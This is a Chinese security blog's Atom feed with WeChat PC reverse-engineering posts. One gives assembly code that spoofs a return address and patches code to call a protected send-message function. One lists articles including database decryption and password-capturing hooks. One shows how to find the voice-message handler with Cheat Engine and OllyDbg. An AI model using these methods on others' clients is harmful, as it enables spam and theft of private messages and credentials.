<?xml version="1.0" encoding="utf-8"?> <feed xmlns="http://www.w3.org/2005/Atom">   <title>Anhkgg&#39;Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘</title>   <subtitle>Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</subtitle>   <link href="/atom.xml" rel="self"/>      <link href="https://anhkgg.github.io/"/>   <updated>2019-08-09T06:48:39.794Z</updated>   <id>https://anhkgg.github.io/</id>      <author>     <name>Anhkgg</name>        </author>      <generator uri="http://hexo.io/">Hexo</generator>      <entry>     <title>一次美丽的误会引发对函数调用保护的思考</title>     <link href="https://anhkgg.github.io/anti-call/"/>     <id>https://anhkgg.github.io/anti-call/</id>     <published>2019-08-09T06:45:27.000Z</published>     <updated>2019-08-09T06:48:39.794Z</updated>          <content type="html"><![CDATA[<p>如何防止别人调用自己的函数？</p> <a id="more"></a> <p>很久没碰wx了，最近想写个东西，就重新拿了起来，最新版本2.6.8.65（此时已经2.6.8.68）。</p> <p>找到以前分析过的发送文本消息接口，发现函数大变样，很明显的vm痕迹。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.vmp0:1131CE33 000                 push    2493AC03h</span><br><span class="line">.vmp0:1131CE38 004                 call    sub_1134AEB3</span><br><span class="line">.vmp0:1131CE3D 000                 mov     cx, [ebp+0]</span><br><span class="line">.vmp0:1131CE42 000                 test    bp, 373Dh</span><br><span class="line">.vmp0:1131CE47 000                 shl     ah, cl</span><br><span class="line">.vmp0:1131CE49 000                 mov     dx, [ebp+2]</span><br><span class="line">.vmp0:1131CE4E 000                 cmovnb  eax, edi</span><br><span class="line">.vmp0:1131CE51 000                 lea     ebp, [ebp-2]</span><br><span class="line">...</span><br><span class="line">.vmp0:1131CE9C                     bswap   eax</span><br><span class="line">.vmp0:1131CE9E                     inc     eax</span><br></pre></td></tr></table></figure> <p>当时也没在意，仔细看接口参数并没有变化，就直接拿来用了。</p> <p>结果发现接口不能用了，并没有成功发送文本信息。</p> <p>擦，难道vm里面藏了什么玄机，做了防止函数调用的保护？？</p> <p>…</p> <p>正整备大干一场的时候，重新测试给别人发送消息是ok的。</p> <p>这是一次美丽的误会，测试时是给自己的微信发送消息，结果证明该接口是不能给自己发的，所以没成功。</p> <p>…</p> <p>然后就继续说说先前自以为的wx在函数中可能做的防止调用的保护吧。</p> <h3 id="防"><a href="#防" class="headerlink" title="防"></a>防</h3><p>按照自己思考的防止别人调用函数的思路，其实就是检查调用源，那么肯定是从调用栈入手：</p> <ol> <li>在函数内部回溯调用堆栈，检查返回地址</li> <li>返回地址为微信模块则正常调用，否则拒绝执行</li> <li>可能检查一层（wechatwin.dll），或者多层</li> <li>可能检测返回地址在模块范围，或者是准确的返回地址</li> <li>vm相关逻辑，增加分析难度</li> </ol> <p>大概实现代码就是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void TestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line">//vmstart</span><br><span class="line">    DWORD retAddr = *((DWORD*)((char*)&amp;a1 - 4));//</span><br><span class="line">    if(retAddr &gt; wxModuleBase &amp;&amp; retAddr &lt; wxModuleEnd) &#123;</span><br><span class="line">      //do things</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       //anti</span><br><span class="line">      //do nothing</span><br><span class="line">    &#125;</span><br><span class="line">//vmend</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <h3 id="攻"><a href="#攻" class="headerlink" title="攻"></a>攻</h3><p>所以能够想到的对抗方式就是在调用TestAntiCall的时候，修改调用栈返回地址，让TestAntiCall误以为确实是正常调用。</p> <p>这里分析只考虑检查一层返回地址。</p> <p>比如如下正常调用代码，00003就是返回地址，在合法模块内，即可正常调用。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//正常调用代码</span><br><span class="line">void Right_TestAntiCall()</span><br><span class="line">&#123;</span><br><span class="line">00001 push a1</span><br><span class="line">00002 call TestAntiCall</span><br><span class="line">00003 add esp, 4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>而我的调用TestAntiCall函数（在我的模块内）如下，<code>add esp, 4;</code>为TestAntiCall拿到的返回地址，这个地址肯定在我的模块内，调用失败。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pfnTestAntiCall = 原始TestAntiCall地址;</span><br><span class="line">pfnTestAntiCall_RetAddr = 000003;//调用TestAntiCall返回地址</span><br><span class="line">//这个会失败</span><br><span class="line">void MyTestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line"> __asm &#123;</span><br><span class="line">    push a1;</span><br><span class="line">    call pfnTestAntiCall;</span><br><span class="line">    add esp, 4; //返回地址</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>然后尝试欺骗<code>TestAntiCall</code>，我们修改一下调用栈的返回地址（本来应该是MyRetAddr）。</p> <p>通过<code>push+jmp</code>来替换通常的<code>call</code>，这样返回地址由我们自己压入，这里压入正常调用的返回地址<code>g_SendTextMsgRetAddr</code>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//这个会成功</span><br><span class="line">void MyTestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push a1;</span><br><span class="line">        push g_SendTextMsgRetAddr;//压入原始retaddr</span><br><span class="line">        jmp pfnWxSendTextMsg; //调用函数，这样函数内部检测就是正常的</span><br><span class="line">        add esp, 4; //MyRetAddr</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>当然，就这么简单的调用，肯定会出问题的，因为<code>jmp pfnWxSendTextMsg</code>之后，就会返回到<code>Right_TestAntiCall</code>的<code>00003</code>，如此显然导致栈破坏，会出现崩溃。</p> <p>所以为了让程序正常执行，还需要多两个处理步骤。</p> <ol> <li><code>Right_TestAntiCall</code>的00003处修改指令为jmp MyRetAddr。让执行流返回到MyTestAntiCall1</li> <li>恢复00003处原始指令。</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">//1. `Right_TestAntiCall`的00003处修改指令为jmp MyRetAddr。让执行流返回到MyTestAntiCall1</span><br><span class="line">void fakeAntiTestCall(DWORD retaddr1, DWORD retaddr2, char OrigCode[5])</span><br><span class="line">&#123;</span><br><span class="line">    DWORD MyRetAddr = retaddr1 - 24;</span><br><span class="line">    DWORD ShellCode[5] = &#123; 0xe9, 0x00, 0x00, 0x00, 0x00 &#125;;</span><br><span class="line">    *((DWORD*)(&amp;ShellCode[1])) = MyRetAddr;</span><br><span class="line">    memcpy(OrigCode, (char*)retaddr2, 5);</span><br><span class="line">    Patch((PVOID)retaddr2, 5, ShellCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//2. 恢复00003处原始指令。</span><br><span class="line">void fakeAntiTestCall1(DWORD retaddr2, char OrigCode[5])</span><br><span class="line">&#123;</span><br><span class="line">    Patch((PVOID)retaddr2, 5, OrigCode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这个会成功</span><br><span class="line">void MyTestAntiCall(DWORD a1)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD MyRetAddr = 0;</span><br><span class="line">    char OrigCode[5] = &#123; 0 &#125;;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        jmp RET1;</span><br><span class="line">    INIT:</span><br><span class="line">        pop eax;//retAddr</span><br><span class="line">        mov MyRetAddr, eax;</span><br><span class="line">        lea eax, OrigCode;</span><br><span class="line">        push eax;</span><br><span class="line">        push g_SendTextMsgRetAddr;</span><br><span class="line">        push MyRetAddr;</span><br><span class="line">        call fakeAntiTestCall; //在原始g_SendTextMsgRetAddr处跳入MyTestAntiCall1的MyRetAddr</span><br><span class="line">        push a1;</span><br><span class="line">        push g_SendTextMsgRetAddr;//压入原始retaddr</span><br><span class="line">        jmp pfnWxSendTextMsg; //调用函数，这样函数内部检测就是正常的</span><br><span class="line">        add esp, 4; //MyRetAddr</span><br><span class="line">        lea eax, OrigCode;</span><br><span class="line">        push eax;</span><br><span class="line">        push g_SendTextMsgRetAddr;</span><br><span class="line">        call fakeAntiTestCall1;//恢复g_SendTextMsgRetAddr数据</span><br><span class="line">        ret;</span><br><span class="line">    RET1:</span><br><span class="line">        call INIT;</span><br><span class="line">        nop;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>为了拿到MyRetAddr的地址，通过call+pop的方法完成，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">    jmp RET1:</span><br><span class="line">    WORK:</span><br><span class="line">        pop eax; //eax = retaddr</span><br><span class="line">        mov retaddr, eax;</span><br><span class="line">        //do thing</span><br><span class="line">        add esp, 4;//MyRetAddr</span><br><span class="line">    RET1:</span><br><span class="line">        call WORK;//push retaddr; jmp WORK;</span><br><span class="line">        nop;//retaddr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>上面拿到retaddr和MyRetAddr明显不是同一个，所以在<code>fakeAntiTestCall</code>中减去一个偏移24拿到<code>MyRetAddr</code>。</p> <p>偏移值通过下面的字节码可以计算出来<code>10024E1E</code> - <code>10024E06</code> = 24。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:10024DDF EB 37                             jmp     short RET1</span><br><span class="line">.text:10024DE1                   INIT:   </span><br><span class="line">.text:10024DE1 58                                pop     eax</span><br><span class="line">.text:10024DE2 89 45 F4                          mov     MyRetAddr, eax</span><br><span class="line">.text:10024DE5 8D 45 F8                          lea     eax, OrigCode</span><br><span class="line">.text:10024DE8 50                                push    eax</span><br><span class="line">.text:10024DE9 FF 35 00 D0 25 10                 push    pfnTestAntiCall_RetAddr</span><br><span class="line">.text:10024DEF FF 75 F4                          push    MyRetAddr</span><br><span class="line">.text:10024DF2 E8 C9 00 00 00                    call    fakeAntiTestCall; </span><br><span class="line">.text:10024DF7 FF 75 E0                          push    a1</span><br><span class="line">.text:10024DFA FF 35 00 D0 25 10                 push    pfnTestAntiCall_RetAddr</span><br><span class="line">.text:10024E00 FF 25 D4 A4 28 10                 jmp     pfnTestAntiCall; </span><br><span class="line">.text:10024E06 83 C4 04                          add     esp, 4</span><br><span class="line">.text:10024E09 8D 45 F8                          lea     eax, OrigCode</span><br><span class="line">.text:10024E0C 50                                push    eax</span><br><span class="line">.text:10024E0D FF 35 00 D0 25 10                 push    MyRetAddr</span><br><span class="line">.text:10024E13 E8 88 00 00 00                    call    fakeAntiTestCall1; </span><br><span class="line">.text:10024E14 C3                                ret;</span><br><span class="line">.text:10024E19</span><br><span class="line">.text:10024E19                   RET1:    </span><br><span class="line">.text:10024E19 E8 C4 FF FF FF                    call    INIT</span><br><span class="line">.text:10024E1E 90                                nop</span><br></pre></td></tr></table></figure> <p>如此可以正常完成一次调用，但是还有问题，因为会反复修改<code>Right_TestAntiCall</code>的指令，可能在多线程中执行时出现问题。</p> <p>所以更好的方法时在<code>Right_TestAntiCall</code>的模块中找一个不用（零值）的内存，用来保护临时指令，不细讲了，大家自行探索吧。</p> <p>（完）</p> <p>转载请注明出处：<a href="https://anhkgg.com/anti-call/" target="_blank" rel="noopener">https://anhkgg.com/anti-call/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;如何防止别人调用自己的函数？&lt;/p&gt;          </summary>            <category term="secure" scheme="https://anhkgg.github.io/categories/secure/"/>                 <category term="微信" scheme="https://anhkgg.github.io/tags/%E5%BE%AE%E4%BF%A1/"/>            <category term="保护" scheme="https://anhkgg.github.io/tags/%E4%BF%9D%E6%8A%A4/"/>        </entry>      <entry>     <title>微信逆向分析相关研究技术文章收集</title>     <link href="https://anhkgg.github.io/wechat-pc-study-technical-article-sets/"/>     <id>https://anhkgg.github.io/wechat-pc-study-technical-article-sets/</id>     <published>2019-08-06T02:43:05.000Z</published>     <updated>2019-08-06T03:10:53.837Z</updated>          <content type="html"><![CDATA[<p>微信相关研究技术文章收集，版权属于原作者，不定时更新。</p> <p>欢迎关注：<a href="https://github.com/anhkgg/awesome-wechat-technology" target="_blank" rel="noopener">https://github.com/anhkgg/awesome-wechat-technology</a></p> <a id="more"></a> <ul> <li><a href="https://mp.weixin.qq.com/s/bb7XMxop7e8rd7YqQ88nyA" target="_blank" rel="noopener">微信(WeChat)电脑端多开分析+源码</a></li> <li><a href="https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/E7N6LzAH4p88Gu4f_qwGlg</a></li> <li><a href="https://mp.weixin.qq.com/s/h9d8aO79OvkpV9bknVT60A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/h9d8aO79OvkpV9bknVT60A</a></li> <li><a href="https://mp.weixin.qq.com/s/uUXB9AHtnhCsD7gAfFYRoA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uUXB9AHtnhCsD7gAfFYRoA</a></li> <li><a href="https://mp.weixin.qq.com/s/WBDPc3Vd0X_zLb3qqITlmg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WBDPc3Vd0X_zLb3qqITlmg</a></li> <li><a href="https://mp.weixin.qq.com/s/yGj_63iRbXRdJcnXKv9P8w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/yGj_63iRbXRdJcnXKv9P8w</a></li> <li><p><a href="https://mp.weixin.qq.com/s/JTHa4xOgD-CbgB8Rbkd3SA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/JTHa4xOgD-CbgB8Rbkd3SA</a></p> </li> <li><p><a href="https://bbs.pediy.com/thread-217610.htm" target="_blank" rel="noopener">[原创] 微信(WeChat)电脑端多开分析+源码</a></p> </li> <li><a href="https://bbs.pediy.com/thread-249274.htm" target="_blank" rel="noopener">[原创]微信PC端技术研究(2)-保存聊天语音</a></li> <li><a href="https://bbs.pediy.com/thread-248080.htm" target="_blank" rel="noopener">[原创]微信PC端技术研究-消息防撤销</a></li> <li><a href="https://bbs.pediy.com/thread-249635.htm" target="_blank" rel="noopener">[原创]SuperWeChatPC开源开放开发者SDK-打造你的超级微信</a></li> <li><a href="https://bbs.pediy.com/thread-249542.htm" target="_blank" rel="noopener">[原创]微信PC端技术研究(3)-如何找到消息发送接口</a></li> <li><a href="https://bbs.pediy.com/thread-200129.htm" target="_blank" rel="noopener">[原创]微信聊天备份加密原理</a></li> </ul> <p><strong>鬼手系列</strong></p> <ul> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97820327" target="_blank" rel="noopener">PCXX逆向：终结篇——定位关键call的思路总结</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97819595" target="_blank" rel="noopener">PCXX逆向：分析微信发送文件call</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97818674" target="_blank" rel="noopener">PCXX逆向：分析群拉人功能</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97817650" target="_blank" rel="noopener">PCXX逆向：分析发送xml名片call</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97672427" target="_blank" rel="noopener">PCXX逆向：分析@群成员call</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/97404761" target="_blank" rel="noopener">PCXX逆向：实现自动添加好友分享名片</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96757192" target="_blank" rel="noopener">PCXX逆向：分析获取群成员列表的call(part2)</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96755951" target="_blank" rel="noopener">PCXX逆向：分析获取群成员列表的call(part1)</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96723746" target="_blank" rel="noopener">【开源】WeChatRobot+WeChatHelper 制作自己的微信机器人</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/96606530" target="_blank" rel="noopener">PC微信逆向：两种姿势教你解密数据库文件</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/95889507" target="_blank" rel="noopener">PCXX逆向：使用HOOK获取好友列表和群列表</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/93339861" target="_blank" rel="noopener">PCXX逆向：发送与接收消息的分析与代码实现</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/93304599" target="_blank" rel="noopener">PCXX逆向：四种姿势教你干掉防多开</a></li> <li><a href="https://blog.csdn.net/qq_38474570/article/details/92798577" target="_blank" rel="noopener">PCXX逆向：使用HOOK拦截二维码</a></li> <li><p><a href="https://blog.csdn.net/qq_38474570/article/details/92571302" target="_blank" rel="noopener">PCXX逆向：使用CE+OD查找个人数据</a></p> </li> <li><p><a href="https://bbs.pediy.com/thread-222652.htm" target="_blank" rel="noopener">[原创]微信数据库解密算法</a></p> </li> <li><a href="https://bbs.pediy.com/thread-220798.htm" target="_blank" rel="noopener">[原创]pc端微信逆向分析</a></li> <li><a href="https://bbs.pediy.com/thread-223090.htm" target="_blank" rel="noopener">[原创]pc端微信辅助工具，duilib spy</a></li> <li><a href="https://www.52pojie.cn/thread-924687-1-1.html" target="_blank" rel="noopener">PC微信逆向 — 分析获取登录二维码的数据</a></li> <li><p><a href="https://bbs.pediy.com/thread-251303.htm" target="_blank" rel="noopener">[原创]PC版微信数据库解密详细教程</a></p> </li> <li><p><a href="https://bbs.pediy.com/thread-224988.htm" target="_blank" rel="noopener">[原创]PC微信发送消息研究</a></p> </li> <li><a href="https://bbs.pediy.com/thread-223178.htm" target="_blank" rel="noopener">[原创] 对控制PC端微信发送信息的研究</a></li> <li><a href="https://bbs.pediy.com/thread-223002.htm" target="_blank" rel="noopener">[原创]微信逆向之 —给微信添加控件–笔记</a></li> <li><p><a href="https://bbs.pediy.com/thread-248389.htm" target="_blank" rel="noopener">[原创]关于微信聊天机器人的半hook半协议研究</a></p> </li> <li><p><a href="https://blog.csdn.net/qq_21051503/article/details/79746742" target="_blank" rel="noopener">[原创]微信安卓协议分析笔记</a> 被和谐</p> </li> <li><a href="https://bbs.pediy.com/thread-228360.htm" target="_blank" rel="noopener">[原创]Xposed<strong><em>__</em></strong>监听微信登录帐号和密码</a></li> </ul> <p>关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> ]]></content>          <summary type="html">            &lt;p&gt;微信相关研究技术文章收集，版权属于原作者，不定时更新。&lt;/p&gt; &lt;p&gt;欢迎关注：&lt;a href=&quot;https://github.com/anhkgg/awesome-wechat-technology&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/anhkgg/awesome-wechat-technology&lt;/a&gt;&lt;/p&gt;          </summary>            <category term="wechat" scheme="https://anhkgg.github.io/categories/wechat/"/>                 <category term="微信" scheme="https://anhkgg.github.io/tags/%E5%BE%AE%E4%BF%A1/"/>            <category term="多开" scheme="https://anhkgg.github.io/tags/%E5%A4%9A%E5%BC%80/"/>            <category term="防撤销" scheme="https://anhkgg.github.io/tags/%E9%98%B2%E6%92%A4%E9%94%80/"/>            <category term="解密" scheme="https://anhkgg.github.io/tags/%E8%A7%A3%E5%AF%86/"/>        </entry>      <entry>     <title>微信PC端技术研究(2)-保存聊天语音</title>     <link href="https://anhkgg.github.io/wechat-voice/"/>     <id>https://anhkgg.github.io/wechat-voice/</id>     <published>2019-02-03T04:07:24.000Z</published>     <updated>2019-03-09T01:55:30.204Z</updated>          <content type="html"><![CDATA[<p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> <blockquote> <p>微信PC端技术研究-保存聊天语音<br>by anhkgg（公众号：汉客儿）<br>2019年1月31日</p> </blockquote> <h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0. 前言"></a>0x0. 前言</h3><p>虽然一直知道CE，也用过一段时间，但一直用不好，可能太笨。</p> <p>最近又学习了某位大佬用CE的方法，大佬的一句话有点醍醐灌顶，然后有了新的感觉，然后开始尝试实践这篇文章。</p> <p>自己总结一下CE用法的核心思路：通过各种技巧搜索找到内存中关键数据，然后结合动态调试找到操作数据的函数。</p> <p>准备工具：Cheat Engine，OllyDbg，IDA。</p> <a id="more"></a> <h3 id="0x1-了解CE"><a href="#0x1-了解CE" class="headerlink" title="0x1. 了解CE"></a>0x1. 了解CE</h3><p>官网：<a href="https://www.cheatengine.org/" target="_blank" rel="noopener">https://www.cheatengine.org/</a></p> <p>看看来自百科的介绍：</p> <blockquote> <p>Cheat Engine 是一款内存修改编辑工具 ，它允许你修改你的游戏或软件内存数据，以得到一些其他功能。它包括16进制编辑，反汇编程序，内存查找工具。与同类修改工具相比，它具有强大的反汇编功能，且自身附带了外挂制作工具，可以用它直接生成外挂。</p> </blockquote> <p>在我看来，CE做的最好的就是各种策略的内存搜索能力。</p> <ol> <li><p>支持准确数据（整数、字符串、十六进制、浮点数、字节数组等等）搜索，针对目标数据明确效果显著，比如金币数。</p> </li> <li><p>支持数据范围的搜索，比如大于某个值，小于某个值等等。比如想找到没有显示数值的血量数据。</p> </li> <li><p>支持多组数据同时搜索，针对数据结构复杂的情况</p> </li> <li><p>支持搜索结果的多次过滤（图中框选的Next Scan），最终找到目标数据。比如血量未知时，通过加血、减血多次搜索最终找到血量地址。</p> </li> </ol> <p><img src="/img/wx2/image001.png" alt="img"></p> <p>说到底CE内存搜索的能力就是通过各种策略帮助你找到游戏中需要修改的数据（比如血量、分数、金币等等），然后通过内存修改能力（直接改血量）打破游戏平衡，外挂制作工具生成外挂，助你超神！</p> <p>更多CE的高级应用可以访问：</p> <p><a href="https://blog.csdn.net/cgs_______/article/details/77799091" target="_blank" rel="noopener">https://blog.csdn.net/cgs<strong>___</strong>/article/details/77799091</a></p> <p><a href="https://blog.csdn.net/zhaobisheng1/article/details/79259460" target="_blank" rel="noopener">https://blog.csdn.net/zhaobisheng1/article/details/79259460</a></p> <h3 id="0x2-分析"><a href="#0x2-分析" class="headerlink" title="0x2. 分析"></a>0x2. 分析</h3><p>进入正题，本文是要拿到微信聊天的语音消息，然后dump保存下来。</p> <p>要按以前我的思路，会通过网络通信找到接受消息的函数，然后找到语音数据，看起来很简单，但是有点难。</p> <p>因为函数真的很多，网络消息也会受到很多干扰。</p> <p>现在用CE了，应该怎么办呢？</p> <h4 id="找到关键数据"><a href="#找到关键数据" class="headerlink" title="找到关键数据"></a>找到关键数据</h4><p>关键数据肯定是语音消息了，但是怎么搜索呢，肯定搜语音内容不现实，所以转了弯，先看看文字消息，找到接受文字消息处理函数之后，猜测语音处理函数会相同或者在不同分支。</p> <p>接着，如何搜索文字消息呢？已经收到的显示在聊天窗口的内容当然可以通过CE找到，但是没用啊，它和接受文字消息处理函数已经没关系了，流程已经处理完成了。</p> <p>那么在测试中肯定知道发送的消息内容，通过CE来搜索可以吗？</p> <p>额，我觉得不行，还没收到消息呢，内存中也没有这个文字消息，搜索不到（如果可以，请大佬指点一下）。</p> <p>能想到的是，在接受到消息某一点通过调试器断下来，然后CE搜索，这样可以，但是这个断点找不到阿，放弃。</p> <p>那怎么办呢？</p> <p>看到左侧聊天列表中显示的最新一条消息，有了新的思路。</p> <p><img src="/img/wx2/image003.png" alt="img"></p> <p>每次收到新消息后，都会在列表中显示最新消息内容（图中绿框指示位置、注意是unicode字符）。</p> <p>那么，先用CE（First Scan）搜索当前搜到的消息内容，找到可能的内存地址。多次接受不同消息后，Next Scan按钮搜索每次新的消息内容，最终确定聊天列表中显示的最新消息内容的内存地址。</p> <p>多次刷选之后，留下两个地址，通过CE修改内容，在界面中查看是否改变，最终确认第二个地址就是我们的目标，暂把该地址记录为MsgAddr。</p> <p><img src="/img/wx2/image005.png" alt="img"></p> <h4 id="分析消息接收函数"><a href="#分析消息接收函数" class="headerlink" title="分析消息接收函数"></a>分析消息接收函数</h4><p>关键数据地址已经找到，下面的工作复杂也不复杂，就看微信是如何实现的了。</p> <p>猜测微信实现消息显示的流程是这样的：</p> <ol> <li><p>recv收到消息，组装完整包后，分发给消息处理函数</p> </li> <li><p>根据wxid找到要显示消息的列表项，如果不在已聊天消息列表，就新建一个项</p> </li> <li><p>在列表中显示消息，如果是表情显示[文字]，语音显示为[语音]，消息插入wxid对应消息队列，或者存入数据库</p> </li> </ol> <p>步骤3中肯定要写前面找到的MsgAddr内存，把最新消息显示到界面中，这个流程肯定在消息处理函数内部。</p> <p>So，通过OD对MsgAddr下内存写入断点，回溯堆栈就可以找到消息处理函数。</p> <p>具体操作如下：</p> <p>OD挂载Wechat.exe进程后，在左下角内存窗口处Ctrl+G，输入找到的MsgAddr（11A11F34）回车，定位到该数据，然后再HEX数据处，右键弹出菜单，选择断点-&gt;内存写入。</p> <p><img src="/img/wx2/image007.png" alt="img"><br><img src="/img/wx2/image009.png" alt="img"></p> <p>断点设置完成后，测试发送文字消息，OD断住，代码窗口显示的就是修改MsgAddr的代码位置，如上图10CE412C处。</p> <p>Alt+K查看当前堆栈。</p> <p><img src="/img/wx2/image011.png" alt="img"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">调用堆栈</span><br><span class="line">地址       堆栈       函数过程 / 参数                       调用来自                      结构</span><br><span class="line">0012E068   106BD6F3   WeChatWi.10CE4110                     WeChatWi.106BD6EE             0012E064 //wcsncpy</span><br><span class="line">0012E088   106BD769   WeChatWi.106BD67E                     WeChatWi.106BD764             0012E084</span><br><span class="line">0012E09C   1011DD8B   WeChatWi.106BD753                     WeChatWi.1011DD86             0012E098</span><br><span class="line">0012E0EC   10206C67   包含WeChatWi.1011DD8B                   WeChatWi.10206C64             0012E0E8</span><br><span class="line">0012E600   1020E8F1   ? WeChatWi.10206460                   WeChatWi.1020E8EC             0012E5FC //界面操作</span><br></pre></td></tr></table></figure> <p>看到这个调用栈是不是感觉好少，分析起来肯定简单。但，其实是OD显示的并不全，此时真的很想用windbg。</p> <p>在OD的右下角堆栈窗口，可以看到当前调用栈的参数和预览数据。F8单步（或者Alt+F8执行到返回）逐步的回溯每层堆栈。关注MsgAddr的数据是如何生成的，也就是找到数据来源，然后找到消息处理函数。</p> <p><img src="/img/wx2/image013.png" alt="img"></p> <p>跟踪过程不赘述（需要熟悉汇编知识），直到看到的最顶层的WeChatWi.10206460处，发现是把收到的消息内容显示到聊天列表处的一个界面功能函数。</p> <p>那这里不是可以拿到消息了吗，是的，普通文字消息已经可以拿到，但是语音内容不行。</p> <p>通过观察内存窗口的数据，整理WeChatWi.10206460处的关于消息参数的大致结构。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span 